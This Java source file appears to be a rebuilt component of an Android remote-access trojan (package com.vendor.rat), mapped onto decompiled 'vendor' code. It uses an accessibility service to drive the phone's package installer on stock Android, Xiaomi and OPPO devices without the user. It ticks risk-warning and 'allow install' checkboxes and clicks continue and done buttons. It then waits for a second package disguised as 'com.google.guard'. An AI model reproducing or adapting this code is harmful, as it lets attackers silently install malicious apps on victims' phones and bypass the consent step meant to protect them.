package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.BoolCondition;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 静默安装自动化代理
 *
 * Vendor: o/x.java (531 行)
 * 功能: 监听 PackageInstaller 安装界面，自动点击安装/继续/完成按钮
 *       支持多厂商安装界面:
 *         - com.android.packageinstaller (通用)
 *         - com.miui.securitycenter (小米)
 *         - com.oplus.appdetail (OPPO/OnePlus)
 *       超时: 华为/vivo/OPPO 180秒, 其他 120秒
 *
 * 字段对齐:
 *   f705n → timeoutScheduler (ScheduledExecutorService)
 *   f706o → processedActions (ConcurrentLinkedQueue)
 *   f707p → finishLock (ReentrantLock)
 *
 * 方法对齐:
 *   H()  → createPackageInstallerWindow()
 *   M()  → createContinueInstallFilters()
 *   N()  → createListenWindows()
 *   P()  → createMiuiAdbInstallWindow()
 *   Q()  → createMiuiAlertDialogWindow()
 *   R()  → isHuaweiOrVivoOrOppo()
 *   S()  → createOplusInstallGuideWindow()
 *   T()  → createOplusInstallFinishWindow()
 *   U()  → createOplusInstallProgressWindow()
 *   V()  → createOplusPackageInstallerWindow()
 *   I()  → findAndCheckAllowInstallCheckbox()
 *   J()  → findAndClickContinueInstall()
 *   K()  → findAndClickInstallDone()
 *   L()  → waitForInstallAndFinish() [反编译失败]
 *   O()  → isInstalling()
 *   W()  → finishEngine()
 *   d()  → destroy() (override)
 *   u()  → onAccessibilityEvent() (override)
 *   equals/hashCode → singleton pattern
 */
public class PackageInstallerDelegate extends AutoEngine {

    private static final String TAG = "PkgInstallDelegate";

    // 包名常量
    private static final String PKG_INSTALLER = "com.android.packageinstaller";
    private static final String MIUI_SECURITY = "com.miui.securitycenter";
    private static final String OPLUS_APPDETAIL = "com.oplus.appdetail";

    // ADAPT: f705n → timeoutScheduler
    public final ScheduledExecutorService timeoutScheduler;

    // ADAPT: f706o → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    // ADAPT: f707p → finishLock
    public final ReentrantLock finishLock;

    public PackageInstallerDelegate() {
        super(createListenWindows(), PKG_INSTALLER);
        ScheduledExecutorService ses = Executors.newSingleThreadScheduledExecutor();
        this.timeoutScheduler = ses;
        this.processedActions = new ConcurrentLinkedQueue<>();
        this.finishLock = new ReentrantLock();
        try {
            // ADAPT: vendor 根据厂商设置不同超时
            long timeout = (DeviceUtils.isHuawei() || DeviceUtils.isVivo()) ? 180L : 120L;
            ses.schedule(() -> finishEngine(), timeout, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule timeout error", e);
        }
    }

    // ============ 静态窗口构建方法 ============

    /**
     * ADAPT: H() → createPackageInstallerWindow
     * 通用安装界面
     */
    public static WindowMatcher createPackageInstallerWindow() {
        return new WindowMatcher(PKG_INSTALLER,
                "com.android.packageinstaller.PackageInstallerActivity")
                .addEventType(32).addEventType(16384).addEventType(2048);
    }

    /**
     * ADAPT: Q() → createMiuiAlertDialogWindow
     */
    public static WindowMatcher createMiuiAlertDialogWindow() {
        return new WindowMatcher(MIUI_SECURITY, "miuix.appcompat.app.AlertDialog")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: P() → createMiuiAdbInstallWindow
     */
    public static WindowMatcher createMiuiAdbInstallWindow() {
        return new WindowMatcher(MIUI_SECURITY,
                "com.miui.permcenter.install.AdbInstallActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: S() → createOplusInstallGuideWindow
     */
    public static WindowMatcher createOplusInstallGuideWindow() {
        return new WindowMatcher(OPLUS_APPDETAIL,
                "com.oplus.appdetail.model.guide.ui.InstallGuideActivity")
                .addEventType(32).addEventType(16384).addEventType(2048);
    }

    /**
     * ADAPT: T() → createOplusInstallFinishWindow
     */
    public static WindowMatcher createOplusInstallFinishWindow() {
        return new WindowMatcher(OPLUS_APPDETAIL,
                "com.oplus.appdetail.model.finish.InstallFinishActivity")
                .addEventType(32).addEventType(16384).addEventType(2048);
    }

    /**
     * ADAPT: U() → createOplusInstallProgressWindow
     */
    public static WindowMatcher createOplusInstallProgressWindow() {
        return new WindowMatcher(PKG_INSTALLER,
                "com.android.packageinstaller.oplus.InstallAppProgress")
                .addEventType(32).addEventType(16384).addEventType(2048);
    }

    /**
     * ADAPT: V() → createOplusPackageInstallerWindow
     */
    public static WindowMatcher createOplusPackageInstallerWindow() {
        return new WindowMatcher(PKG_INSTALLER,
                "com.android.packageinstaller.oplus.OPlusPackageInstallerActivity")
                .addEventType(32).addEventType(16384).addEventType(2048);
    }

    /**
     * ADAPT: R() → isHuaweiOrVivoOrOppo
     */
    public static boolean isHuaweiOrVivoOrOppo() {
        return DeviceUtils.isHuawei() || DeviceUtils.isVivo() || DeviceUtils.isOppo();
    }

    /**
     * ADAPT: N() → createListenWindows
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(createPackageInstallerWindow());
        list.add(createMiuiAlertDialogWindow());
        list.add(createMiuiAdbInstallWindow());
        list.add(createOplusPackageInstallerWindow());
        list.add(createOplusInstallGuideWindow());
        list.add(createOplusInstallProgressWindow());
        list.add(createOplusInstallFinishWindow());
        return list;
    }

    /**
     * ADAPT: M() → createContinueInstallFilters
     * 构建"继续安装"按钮的多厂商匹配过滤器
     */
    public static CombineFilter createContinueInstallFilters() {
        // ADAPT: vendor 使用 CombineFiltersWithOr, 这里用 CombineFilter.or
        List<CombineFilter> filters = new ArrayList<>();

        // MIUI 继续安装按钮文本
        String miuiText = TextConfig.getInstance().getFirst("MIUI_CONTINUE_INSTALL_BTN_TEXT");
        if (miuiText != null && !miuiText.isEmpty()) {
            filters.add(CombineFilter.and(StringCondition.textContains(miuiText)));
        }

        // vivo 继续安装按钮文本
        String vivoText = TextConfig.getInstance().getFirst("VIVO_CONTINUE_INSTALL_BTN_TEXT");
        if (vivoText != null && !vivoText.isEmpty()) {
            filters.add(CombineFilter.and(StringCondition.textEquals(vivoText)));
        }

        // OPPO packageinstaller confirm 按钮 ID
        filters.add(CombineFilter.and(StringCondition.viewId("com.android.packageinstaller:id/confirm_bottom_button_layout")));

        // OPPO 继续安装按钮文本
        String oppoText = TextConfig.getInstance().getFirst("OPPO_CONTINUE_INSTALL_BTN_TEXT");
        if (oppoText != null && !oppoText.isEmpty()) {
            filters.add(CombineFilter.and(StringCondition.textEquals(oppoText)));
        }

        // OPLUS 继续安装按钮 ID
        filters.add(CombineFilter.and(StringCondition.viewId("com.oplus.appdetail:id/view_bottom_guide_continue_install_btn")));

        // OPPO 授权安装按钮文本
        String oppoAuthText = TextConfig.getInstance().getFirst("OPPO_AUTHORIZE_INSTALL_BTN_TEXT");
        if (oppoAuthText != null && !oppoAuthText.isEmpty()) {
            filters.add(CombineFilter.and(StringCondition.textContains(oppoAuthText)));
        }

        // 通用 button1 (LinearLayout 内)
        filters.add(CombineFilter.and(
                StringCondition.className("android.widget.LinearLayout"),
                StringCondition.viewId("android:id/button1")));

        // 硬编码文本
        filters.add(CombineFilter.and(StringCondition.textEquals("立即安装")));
        filters.add(CombineFilter.and(StringCondition.textEquals("仍然安装")));

        return CombineFilter.or(filters.toArray(new CombineFilter[0]));
    }

    // ============ 实例方法 ============

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // ADAPT: 由 onAccessibilityEvent 状态机驱动
    }

    /**
     * ADAPT: I() → findAndCheckAllowInstallCheckbox
     * 查找并勾选"允许安装"复选框
     */
    public boolean findAndCheckAllowInstallCheckbox() {
        UiNode root = k();
        if (root == null) return false;

        Log.d(TAG, "开始查找允许安装复选框");
        root.refresh();
        T0(10);

        // 多种 checkbox ID
        String[] checkboxIds = {
            "com.android.packageinstaller:id/install_risk_tips",
            "com.oplus.appdetail:id/safe_guard_checkbox",
            "com.oplus.appdetail:id/risk_check_box",
            "com.android.packageinstaller:id/deleted_file_state_cb"
        };

        UiNode checkbox = null;
        for (String id : checkboxIds) {
            checkbox = root.findOneByCombine(StringCondition.viewId(id));
            if (checkbox != null) break;
        }

        // 退而求其次: 可点击的 CheckBox
        if (checkbox == null) {
            checkbox = root.findOneByCombine(CombineFilter.and(
                    StringCondition.className("android.widget.CheckBox"),
                    new BoolCondition(BoolCondition.Property.CLICKABLE, true)));
        }

        // 再退: 可勾选的 Button
        if (checkbox == null) {
            checkbox = root.findOneByCombine(CombineFilter.and(
                    StringCondition.className("android.widget.Button"),
                    new BoolCondition(BoolCondition.Property.CHECKABLE, true)));
        }

        if (checkbox == null) return false;

        Log.d(TAG, "允许本次安装查找成功");

        if (!checkbox.isCheckable()) {
            return checkbox.click();
        }

        if (!checkbox.isChecked()) {
            Log.d(TAG, "允许本次安装查找成功，未勾选");
            if (checkbox.isClickable()) {
                checkbox.click();
                T0(10);
                checkbox.refresh();
                Log.d(TAG, "已点击允许本次安装");
            }
            // vendor: 多种点击重试策略 (o/u.java) — 最多 3 次
            if (!checkbox.isChecked()) {
                // 策略1: 尝试点击父节点
                UiNode parent = checkbox.getParent();
                if (parent != null) {
                    parent.click();
                    T0(10);
                    checkbox.refresh();
                    Log.d(TAG, "已通过父节点点击允许本次安装");
                }
                // 策略2: R() 坐标点击
                if (!checkbox.isChecked()) {
                    CheckedResult result = R(checkbox, 3);
                    if (result.isChecked()) {
                        Log.d(TAG, "已通过坐标点击允许本次安装");
                    }
                }
                if (!checkbox.isChecked()) {
                    return false;
                }
            }
            Log.d(TAG, "已勾选允许本次安装");
        }
        return true;
    }

    /**
     * ADAPT: J() → findAndClickContinueInstall
     * 查找并点击"继续安装"按钮 (带重试)
     */
    public boolean findAndClickContinueInstall() {
        UiNode root = k();
        if (root == null) return false;

        // ADAPT: vendor 调用 MyAccessibilityService.I(root) 刷新
        CombineFilter filter = createContinueInstallFilters();
        UiNode button = root.findOneByCombine(filter);

        // 重试最多 20 次
        AtomicInteger retryCount = new AtomicInteger(0);
        while (button == null && retryCount.incrementAndGet() <= 20) {
            T0(5);
            button = root.findOneByCombine(filter);
        }

        if (button != null) {
            T0(5);
            if (button.isClickable() && button.click()) {
                Log.d(TAG, "查找并点击继续安装成功");
                return true;
            }
            UiNode parent = button.getParent();
            if (parent != null && parent.isClickable() && parent.click()) {
                Log.d(TAG, "查找并点击继续安装成功");
                return true;
            }
            if (button.click()) {
                Log.d(TAG, "查找并点击继续安装成功");
                return true;
            }
        }
        return false;
    }

    /**
     * ADAPT: K() → findAndClickInstallDone
     * 查找并点击"安装完成"按钮
     */
    public boolean findAndClickInstallDone() {
        UiNode root = k();
        if (root == null) return false;

        // 多种完成按钮 ID
        UiNode doneBtn = root.findOneByCombine(
                StringCondition.viewId("com.android.packageinstaller:id/done_button"));
        if (doneBtn == null) {
            doneBtn = root.findOneByCombine(
                    StringCondition.viewId("com.oplus.appdetail:id/launch_button"));
        }
        if (doneBtn == null) {
            String oppoFinishText = TextConfig.getInstance().getFirst("OPPO_INSTALL_FINISH_TEXT");
            if (oppoFinishText != null && !oppoFinishText.isEmpty()) {
                doneBtn = root.findOneByCombine(StringCondition.textEquals(oppoFinishText));
            }
        }

        if (doneBtn != null && doneBtn.click()) {
            Log.d(TAG, "查找并点击完成安装完成");
            return true;
        }

        // 检查 OPPO 安装完成文本
        String oppoDoneText = TextConfig.getInstance().getFirst("OPPO_INSTALL_DONE_TEXT");
        if (oppoDoneText != null && !oppoDoneText.isEmpty()) {
            UiNode doneNode = root.findOneByCombine(StringCondition.textContains(oppoDoneText));
            if (doneNode != null) {
                Log.d(TAG, "安装完成查找成功");
                return true;
            }
        }
        return false;
    }

    /**
     * ADAPT: O() → isInstalling
     * 检查是否正在安装中
     */
    public boolean isInstalling() {
        UiNode root = k();
        if (root == null) return false;

        String installingText = TextConfig.getInstance().getFirst("OPPO_INSTALLING_TEXT");
        if (installingText == null || installingText.isEmpty()) return false;

        UiNode node = root.findOneByCombine(new StringCondition(
                StringCondition.Property.TEXT, installingText, StringCondition.MatchType.STARTS_WITH));
        if (node != null) {
            Log.d(TAG, "正在安装节点查找成功");
            return true;
        }
        return false;
    }

    /**
     * 等待安装完成并结束引擎
     * 对应 vendor: o/u.java L() — 轮询检查备份应用是否安装
     * 反编译失败, 基于 smali 推断: 最多 20 次 x 2秒, 检查 PackageManager
     */
    public void waitForInstallAndFinish() {
        if (!finishLock.tryLock()) return;
        try {
            AtomicInteger retryCount = new AtomicInteger(0);
            boolean installed = false;
            while (!installed && retryCount.incrementAndGet() <= 20) {
                T0(2);
                // vendor: utils.g.d0("com.google.guard") != null
                installed = isPackageInstalled("com.google.guard");
            }
            if (installed) {
                finishEngine();
            }
        } finally {
            finishLock.unlock();
        }
    }

    /**
     * 检查指定包名是否已安装
     * 对应 vendor: com.guard.wallet.utils.g.d0(packageName)
     */
    private boolean isPackageInstalled(String packageName) {
        try {
            android.content.Context ctx = getContext();
            if (ctx == null) return false;
            ctx.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * ADAPT: W() → finishEngine
     * 结束静默安装自动化引擎
     */
    public void finishEngine() {
        Log.d(TAG, "准备结束静默安装自动化引擎");
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            // ADAPT: vendor 调用 P().A() 和 P().u()
            performBack();
        }
        timeoutScheduler.shutdownNow();
        processedActions.clear();
        // ADAPT: vendor 调用 com.guard.wallet.helper.g.c()
        updateProgress(100);
        super.destroy();
        Log.d(TAG, "已结束静默安装自动化引擎");
    }

    // ============ 生命周期 ============

    /**
     * ADAPT: d() → destroy
     */
    @Override
    public void destroy() {
        try {
            timeoutScheduler.shutdownNow();
            processedActions.clear();
            super.destroy();
        } catch (Exception e) {
            Log.e(TAG, "destroy error", e);
        }
    }

    // ============ 事件处理状态机 ============

    /**
     * ADAPT: u() → onAccessibilityEvent
     * 状态机: 根据当前窗口分发到不同处理逻辑
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        super.onAccessibilityEvent(event, packageName, className);

        // 1. 通用安装界面
        List<WindowMatcher> commonList = Collections.singletonList(createPackageInstallerWindow());
        if (matchesAny(commonList)) {
            Log.d(TAG, "已进入通用安装引导窗口");
            processedActions.remove("miuiDialogInstallMatch");
            processedActions.remove("oplusInstallMatch");
            processedActions.remove("commonDialogInstallMatch");
            processedActions.remove("oplusInstallDoneMatch");
            if (!processedActions.contains("commonInstallMatch")) {
                processedActions.add("commonInstallMatch");
                // ADAPT: vendor 根据 isVivo 选择不同 Runnable case
                handleCommonInstall();
            }
        }

        // 2. MIUI 安装对话框
        List<WindowMatcher> miuiList = new ArrayList<>();
        miuiList.add(createMiuiAlertDialogWindow());
        miuiList.add(createMiuiAdbInstallWindow());
        if (matchesAny(miuiList)) {
            Log.d(TAG, "已进入MIUI安装引导对话框");
            processedActions.remove("commonInstallMatch");
            processedActions.remove("oplusInstallMatch");
            processedActions.remove("commonDialogInstallMatch");
            processedActions.remove("oplusInstallDoneMatch");
            if (!processedActions.contains("miuiDialogInstallMatch")) {
                processedActions.add("miuiDialogInstallMatch");
                handleMiuiInstall();
            }
        }

        // 3. 通用 AlertDialog
        // ADAPT: vendor 创建临时 ListenWindow(null, "android.app.AlertDialog")
        if (className != null && className.contains("AlertDialog")
                && !MIUI_SECURITY.equals(packageName)) {
            Log.d(TAG, "已进入通用安装引导对话框");
            processedActions.remove("commonInstallMatch");
            processedActions.remove("miuiDialogInstallMatch");
            processedActions.remove("oplusInstallMatch");
            processedActions.remove("oplusInstallDoneMatch");
            if (!processedActions.contains("commonDialogInstallMatch")) {
                processedActions.add("commonDialogInstallMatch");
                handleCommonDialogInstall();
            }
        }

        // 4. OPPO 安装引导
        List<WindowMatcher> oplusList = new ArrayList<>();
        oplusList.add(createOplusPackageInstallerWindow());
        oplusList.add(createOplusInstallGuideWindow());
        if (matchesAny(oplusList)) {
            Log.d(TAG, "已进入OPPO安装引导窗口");
            handleOplusInstall();
        }

        // 5. OPPO 安装完成
        List<WindowMatcher> oplusDoneList = new ArrayList<>();
        oplusDoneList.add(createOplusInstallProgressWindow());
        oplusDoneList.add(createOplusInstallFinishWindow());
        if (matchesAny(oplusDoneList)) {
            Log.d(TAG, "已进入OPPO安装完成窗口");
            handleOplusInstallDone();
        }
    }

    // ============ 各厂商安装处理 ============

    private void handleCommonInstall() {
        // ADAPT: vendor case 1 (vivo) / case 2 (通用)
        if (findAndCheckAllowInstallCheckbox()) {
            findAndClickContinueInstall();
        } else {
            findAndClickContinueInstall();
        }
    }

    private void handleMiuiInstall() {
        // ADAPT: vendor case 3
        findAndClickContinueInstall();
    }

    private void handleCommonDialogInstall() {
        // ADAPT: vendor case 4
        findAndClickContinueInstall();
    }

    private void handleOplusInstall() {
        // ADAPT: vendor case 5
        if (findAndCheckAllowInstallCheckbox()) {
            findAndClickContinueInstall();
        }
    }

    private void handleOplusInstallDone() {
        // ADAPT: vendor case 6
        findAndClickInstallDone();
    }

    // ============ singleton pattern ============

    @Override
    public boolean equals(Object obj) {
        return obj instanceof PackageInstallerDelegate;
    }

    @Override
    public int hashCode() {
        return Objects.hash(PackageInstallerDelegate.class.getName());
    }
}
